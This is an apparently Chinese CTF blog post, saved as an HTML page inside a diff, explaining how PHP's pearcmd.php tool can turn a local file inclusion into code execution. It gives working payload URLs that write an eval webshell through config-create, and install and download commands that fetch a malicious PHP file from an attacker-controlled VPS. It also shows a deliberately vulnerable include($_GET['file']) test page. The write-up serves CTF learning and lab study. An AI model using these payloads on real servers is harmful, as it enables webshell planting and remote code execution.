@@ -1,0 +1,521 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"fov0813.gitee.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="最近几次比赛见到了几次利用pearcmd命令行工具进行裸文件包含的手法，在这里记录一下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="关于利用pearcmd进行文件包含的一些总结">
+<meta property="og:url" content="https://fov0813.gitee.io/2021/11/26/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="W4rsp1t3&#39;s blog">
+<meta property="og:description" content="最近几次比赛见到了几次利用pearcmd命令行工具进行裸文件包含的手法，在这里记录一下">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fov0813.gitee.io/images/pearcmd_p1.jpg">
+<meta property="og:image" content="https://fov0813.gitee.io/images/pearcmd_p2.jpg">
+<meta property="og:image" content="https://fov0813.gitee.io/images/pearcmd_p3.jpg">
+<meta property="og:image" content="https://fov0813.gitee.io/images/pearcmd_p4.jpg">
+<meta property="og:image" content="https://fov0813.gitee.io/images/pearcmd_p5.jpg">
+<meta property="og:image" content="https://fov0813.gitee.io/images/pearcmd_p6.jpg">
+<meta property="og:image" content="https://fov0813.gitee.io/images/pearcmd_p7.jpg">
+<meta property="article:published_time" content="2021-11-26T07:52:39.000Z">
+<meta property="article:modified_time" content="2021-11-28T16:40:23.506Z">
+<meta property="article:author" content="W4rsp1t3">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="php">
+<meta property="article:tag" content="文件包含">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fov0813.gitee.io/images/pearcmd_p1.jpg">
+
+<link rel="canonical" href="https://fov0813.gitee.io/2021/11/26/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>关于利用pearcmd进行文件包含的一些总结 | W4rsp1t3's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">W4rsp1t3's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-友链">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://fov0813.gitee.io/2021/11/26/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="W4rsp1t3">
+      <meta itemprop="description" content="很久没有更新过博客了">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="W4rsp1t3's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          关于利用pearcmd进行文件包含的一些总结
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-11-26 15:52:39" itemprop="dateCreated datePublished" datetime="2021-11-26T15:52:39+08:00">2021-11-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-11-29 00:40:23" itemprop="dateModified" datetime="2021-11-29T00:40:23+08:00">2021-11-29</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/php/" itemprop="url" rel="index"><span itemprop="name">php</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>最近几次比赛见到了几次利用pearcmd命令行工具进行裸文件包含的手法，在这里记录一下</p>
+<a id="more"></a>
+
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>安装了pear扩展</p>
+<p>php开启了<code>register_argc_argv</code>选项</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>php的pear扩展是一个命令行扩展管理工具，默认的安装路径在<code>/usr/local/lib/php/pearcmd.php</code>，在命令行下可以用<code>pear</code>或<code>php /usr/local/lib/php/pearcmd.php</code>运行，虽然不是在web的目录下，但是如果存在文件包含漏洞，我们就可以运行这个命令行工具</p>
+<p>我们再来看<code>register_argc_argv</code>选项，在这个选项字段如果选了<code>ON</code>的话，URL中?后面的内容会全部传入至<code>$_SERVER[&#39;argv&#39;]</code>这个变量内，无论后面的内容是否有等号。</p>
+<p>pear会在<code>pearcmd.php</code>获取命令行参数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PEAR_Command::setFrontendType(<span class="string">&#x27;CLI&#x27;</span>);</span><br><span class="line">$all_commands = PEAR_Command::getCommands();</span><br><span class="line"></span><br><span class="line">$argv = Console_Getopt::readPHPArgv();</span><br><span class="line"><span class="comment">// fix CGI sapi oddity - the -- in pear.bat/pear is not removed</span></span><br><span class="line"><span class="keyword">if</span> (php_sapi_name() != <span class="string">&#x27;cli&#x27;</span> &amp;&amp; <span class="keyword">isset</span>($argv[<span class="number">1</span>]) &amp;&amp; $argv[<span class="number">1</span>] == <span class="string">&#x27;--&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">unset</span>($argv[<span class="number">1</span>]);</span><br><span class="line">    $argv = array_values($argv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而pear获取命令行参数的函数<code>Consoles/Getopt.php-&gt;readPHPArgv()</code>中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">readPHPArgv</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $argv;</span><br><span class="line">        <span class="keyword">if</span> (!is_array($argv)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!@is_array($_SERVER[<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!@is_array($GLOBALS[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">                    $msg = <span class="string">&quot;Could not read cmd args (register_argc_argv=Off?)&quot;</span>;</span><br><span class="line">                    <span class="keyword">return</span> PEAR::raiseError(<span class="string">&quot;Console_Getopt: &quot;</span> . $msg);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> $GLOBALS[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $_SERVER[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $argv;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>会先尝试<code>$argv</code>变量（这个变量储存在命令行模式下运行php脚本时传入的参数），然后再尝试<code>$_SERVER[&#39;argv&#39;]</code>变量，<code>$_SERVER[&#39;argv&#39;]</code>为我们可控的变量，这样，在文件包含的场景下，我们就可以运行pear命令行工具并用GET请求参数控制pear的命令行参数了。</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>接下来就是寻找可以利用的命令了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">Commands:</span><br><span class="line">build                  Build an Extension From C Source</span><br><span class="line">bundle                 Unpacks a Pecl Package</span><br><span class="line">channel-add            Add a Channel</span><br><span class="line">channel-alias          Specify an alias to a channel name</span><br><span class="line">channel-delete         Remove a Channel From the List</span><br><span class="line">channel-discover       Initialize a Channel from its server</span><br><span class="line">channel-info           Retrieve Information on a Channel</span><br><span class="line">channel-login          Connects and authenticates to remote channel server</span><br><span class="line">channel-logout         Logs out from the remote channel server</span><br><span class="line">channel-update         Update an Existing Channel</span><br><span class="line">clear-cache            Clear Web Services Cache</span><br><span class="line">config-create          Create a Default configuration file</span><br><span class="line">config-get             Show One Setting</span><br><span class="line">config-help            Show Information About Setting</span><br><span class="line">config-set             Change Setting</span><br><span class="line">config-show            Show All Settings</span><br><span class="line">convert                Convert a package.xml 1.0 to package.xml 2.0 format</span><br><span class="line">cvsdiff                Run a &quot;cvs diff&quot; for all files in a package</span><br><span class="line">cvstag                 Set CVS Release Tag</span><br><span class="line">download               Download Package</span><br><span class="line">download-all           Downloads each available package from the default channel</span><br><span class="line">info                   Display information about a package</span><br><span class="line">install                Install Package</span><br><span class="line">list                   List Installed Packages In The Default Channel</span><br><span class="line">list-all               List All Packages</span><br><span class="line">list-channels          List Available Channels</span><br><span class="line">list-files             List Files In Installed Package</span><br><span class="line">list-upgrades          List Available Upgrades</span><br><span class="line">login                  Connects and authenticates to remote server [Deprecated in favor of channel-login]</span><br><span class="line">logout                 Logs out from the remote server [Deprecated in favor of channel-logout]</span><br><span class="line">makerpm                Builds an RPM spec file from a PEAR package</span><br><span class="line">package                Build Package</span><br><span class="line">package-dependencies   Show package dependencies</span><br><span class="line">package-validate       Validate Package Consistency</span><br><span class="line">pickle                 Build PECL Package</span><br><span class="line">remote-info            Information About Remote Packages</span><br><span class="line">remote-list            List Remote Packages</span><br><span class="line">run-scripts            Run Post-Install Scripts bundled with a package</span><br><span class="line">run-tests              Run Regression Tests</span><br><span class="line">search                 Search remote package database</span><br><span class="line">shell-test             Shell Script Test</span><br><span class="line">sign                   Sign a package distribution file</span><br><span class="line">svntag                 Set SVN Release Tag</span><br><span class="line">uninstall              Un-install Package</span><br><span class="line">update-channels        Update the Channel List</span><br><span class="line">upgrade                Upgrade Package</span><br><span class="line">upgrade-all            Upgrade All Packages [Deprecated in favor of calling upgrade with no parameters]</span><br><span class="line">Usage: pear [options] command [command-options] &lt;parameters&gt;</span><br><span class="line">Type &quot;pear help options&quot; to list all options.</span><br><span class="line">Type &quot;pear help shortcuts&quot; to list all command shortcuts.</span><br><span class="line">Type &quot;pear help version&quot; or &quot;pear version&quot; to list version information.</span><br><span class="line">Type &quot;pear help &lt;command&gt;&quot; to get the help for the specified command.</span><br></pre></td></tr></table></figure>
+
+<p>现在介绍三种利用手法</p>
+<p>为了试验这几种方法我用docker在本地搭建了一个文件包含环境，镜像是<code>php:7.4-apache</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="config-create"><a href="#config-create" class="headerlink" title="config-create"></a>config-create</h3><p>此方法来自于<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">p神博客</a></p>
+<p>此命令的参数和用法如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config-create: must have 2 parameters, root path and filename to save as</span><br></pre></td></tr></table></figure>
+
+<p>就是要我们输入两个参数，一个是绝对路径，还有保存配置文件的文件名</p>
+<p>尝试一下使用以下这个命令看下效果</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pear config-create /114514whatever /tmp/test.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/pearcmd_p1.jpg"></p>
+<p>可以看见我们已经写入一个配置文件了，检查下内容</p>
+<p><img src="/images/pearcmd_p2.jpg"></p>
+<p>第一个参数的内容会被写入文件，如果我们将第一个参数换成文件内容的话我们就可以写入可包含的文件了</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+config-create+&#x2F;&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;&#x2F;&lt;?&#x3D;@eval($_POST[&#39;cmd&#39;]);?&gt;+&#x2F;tmp&#x2F;test.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/pearcmd_p3.jpg"></p>
+<p>包含结果：</p>
+<p><img src="/images/pearcmd_p4.jpg"></p>
+<p>我们来看下写入的文件</p>
+<p><img src="/images/pearcmd_p5.jpg"></p>
+<p>可以看见<code>/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST[&#39;cmd&#39;]);?&gt;</code>整个被作为参数传入了命令行，但是get参数file被正常解析了，这是因为前面说过的即使URL中存在等号，问号后的内容一样会被传入<code>$_SERVER[&#39;argv&#39;]</code></p>
+<h3 id="install"><a href="#install" class="headerlink" title="install"></a>install</h3><p>此方法来自<a target="_blank" rel="noopener" href="https://blog.szfszf.top/article/57/">jrXnm师傅的博客</a></p>
+<p>先来看看install的常规用法：</p>
+<p>我在我vps上挂了一个php文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后通过pear下载</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pear install http://[vps]:[port]/test1.php</span><br></pre></td></tr></table></figure>
+
+<p>结果：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pear install http://[vps]:[port]/test1.php</span><br><span class="line">downloading test1.php ...</span><br><span class="line">Starting to download test1.php (20 bytes)</span><br><span class="line">....done: 20 bytes</span><br><span class="line">Could not get contents of package &quot;/tmp/pear/download/test1.php&quot;. Invalid tgz file.</span><br><span class="line">Download of &quot;http://[vps]:[port]/test1.php&quot; succeeded, but it is not a valid package archive</span><br><span class="line">Invalid or missing remote package file</span><br><span class="line">install failed</span><br></pre></td></tr></table></figure>
+
+<p>结果在<code>/tmp/pear/download/</code>目录下有一个<code>test1.php</code></p>
+<p>然后<code>install</code>有<code>--installroot</code>这个选项可以指定他的安装目录，这里可以构造payload远程下载我们的文件了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:3354&#x2F;?+install+--installroot+&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;+http:&#x2F;&#x2F;[vps]:[port]&#x2F;test1.php</span><br></pre></td></tr></table></figure>
+
+<p>这个要被包含的文件就在web目录的<code>&amp;file=/usr/local/lib/php/pearcmd.php\&amp;/tmp/pear/download/</code>下，我们把路径url编码一下再包含</p>
+<p><img src="/images/pearcmd_p6.jpg"></p>
+<p>成功了</p>
+<h3 id="download"><a href="#download" class="headerlink" title="download"></a>download</h3><p>先查看一下download的用法</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pear download [option] [package]</span><br><span class="line"><span class="meta">#</span><span class="bash">这里的option只有一个-Z, --nocompress，下载一个未压缩的tar包</span></span><br></pre></td></tr></table></figure>
+
+<p>尝试一下下恶意的php文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pear download http://[vps]:[port]/test1.php</span><br><span class="line">downloading test1.php ...</span><br><span class="line">Starting to download test1.php (20 bytes)</span><br><span class="line">....done: 20 bytes</span><br><span class="line">Could not get contents of package &quot;/var/www/html/test1.php&quot;. Invalid tgz file.</span><br><span class="line">Download of &quot;http://[vps]:[port]/test1.php&quot; succeeded, but it is not a valid package archive</span><br><span class="line">Invalid or missing remote package file</span><br><span class="line">download failed</span><br></pre></td></tr></table></figure>
+
+<p>虽然提示下载失败，但是直接当前目录留下了php文件</p>
+<p><img src="/images/pearcmd_p7.jpg"></p>
+<p>我们可以尝试一下利用这个<code>download</code></p>
+<p>我构造的payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:3354&#x2F;?+download+http:&#x2F;&#x2F;[vps]:[port]&#x2F;test1.php&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php</span><br></pre></td></tr></table></figure>
+
+<p>当然我提前在服务器上构造好了目录:<code>test1.php&amp;file=/usr/local/lib/php/</code>，将恶意php命名为<code>pearcmd.php</code></p>
+<p>其实可以去掉前面的test1.php，只要在服务器上创建相应的目录就行</p>
+<p>然后直接访问<code>pearcmd.php</code>，成功</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web/" rel="tag"># web</a>
+              <a href="/tags/php/" rel="tag"># php</a>
+              <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag"># 文件包含</a>
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/11/24/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912021%E4%B8%A4%E9%81%93misc%E9%A2%98wp/" rel="prev" title="西湖论剑2021两道misc题wp">
+      <i class="fa fa-chevron-left"></i> 西湖论剑2021两道misc题wp
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="nav-number">1.</span> <span class="nav-text">利用条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">2.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#config-create"><span class="nav-number">3.1.</span> <span class="nav-text">config-create</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#install"><span class="nav-number">3.2.</span> <span class="nav-text">install</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#download"><span class="nav-number">3.3.</span> <span class="nav-text">download</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="W4rsp1t3"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">W4rsp1t3</p>
+  <div class="site-description" itemprop="description">很久没有更新过博客了</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">W4rsp1t3</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
